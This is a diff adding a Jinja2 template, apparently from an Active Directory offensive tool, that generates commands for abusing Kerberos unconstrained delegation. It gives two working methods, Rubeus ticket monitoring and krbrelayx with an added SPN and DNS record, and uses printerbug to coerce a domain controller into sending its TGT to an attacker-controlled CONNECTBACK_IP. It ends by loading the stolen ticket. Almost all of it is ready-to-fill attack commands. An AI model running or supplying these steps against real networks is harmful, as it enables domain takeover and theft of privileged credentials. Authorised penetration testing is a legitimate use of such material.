@@ -1,0 +1,48 @@
+# Unconstrained delegation
+
+{% if not parent.krb_auth %}
+{% include '_TGTRequest.jinja2' %}
+
+{% endif %}
+# Method 1: rubeus
+# - coerce {{dc_name}} to {{parent.obj.name}}:
+# - {{dc_name}} should contact Rubeus, then extract the ticket
+
+# Prepare Rubeus, run the command on {{parent.obj.name}}
+Rubeus.exe monitor /interval:5
+
+# Un-base64 the ticket and save it to rubeus.kirbi
+ticketConverter.py rubeus.kirbi '{{dc_name}}$@{{fqdn}}_krbtgt@{{fqdn}}.ccache'
+
+# End method 1, goto coerce
+
+# Method 2: krbrelay
+# - create a DNS and an SPN: our_domain == CONNECTBACK_IP
+# - force {{dc_name}} to resolve the domain with a coerce
+# - {{dc_name}} should contact the krbrelayx on CONNECTBACK_IP, then extract the ticket
+
+# Add an SPN on {{parent.obj.name}}
+{% set target_name = parent.obj.name %}
+{% set key = 'msDS-AdditionalDnsHostName' %}
+{% set add_value = mydomain|red %}
+{% set write_value = False %}
+{% set save_in_var = False %}
+{% include '_Attr.jinja2' %}
+
+
+# Add a DNS entry
+krbrelayx/dnstool.py -u '{{fqdn}}\{{parent.obj.name}}' -port 636 -force-ssl -dc-ip {{dc_ip}} -dns-ip {{dc_ip}} -k --record {{mydomain|red}} --data {{connectback_ip|red}} --action add {{dc_name}}
+
+# Wait max 3 minutes for the DNS propagation
+dig @{{dc_ip}} {{mydomain|red}}
+
+{% include '_GetAESOnHost.jinja2' %}
+# Prepare krbrelay, use the AES key of {{parent.obj.name}}
+sudo krbrelayx/krbrelayx.py -debug -t idontcaretarget -aesKey {{parent.secret|red}}
+
+# End method 2
+
+# Coerce {{dc_name}} to us (use the ticket of {{parent.obj.name}}), check that you have a 'Saved ticket' in krbrelayx
+krbrelayx/printerbug.py -k -no-pass -dc-ip {{dc_ip}} -target-ip {{dc_ip}} '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' {{mydomain|red}}
+
+export KRB5CCNAME='{{dc_name}}$@{{fqdn}}_krbtgt@{{fqdn}}.ccache'
